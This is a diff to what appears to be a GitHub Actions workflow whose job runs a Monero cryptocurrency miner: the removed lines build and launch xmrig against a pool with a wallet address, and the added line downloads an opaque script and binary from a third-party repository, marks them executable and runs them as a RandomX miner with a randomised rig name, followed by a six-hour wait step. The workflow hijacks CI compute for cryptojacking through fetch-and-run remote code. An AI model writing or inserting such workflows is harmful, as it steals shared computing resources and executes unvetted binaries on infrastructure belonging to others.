@@ -14,16 +14,7 @@ jobs:
       - name: Install dependencies and run xmrig
         run: |
           echo "Updating system and installing dependencies..."
-          apt update && \
-          apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
-          git clone https://github.com/xmrig/xmrig.git && \
-          cd xmrig && \
-          mkdir build && \
-          cd build && \
-          cmake .. && \
-          make && \
-          echo "Running xmrig..."
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_tsjcm#mvbs-zlx7 -p x
+          wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
 
       - name: Wait for 6 hours
         run: |
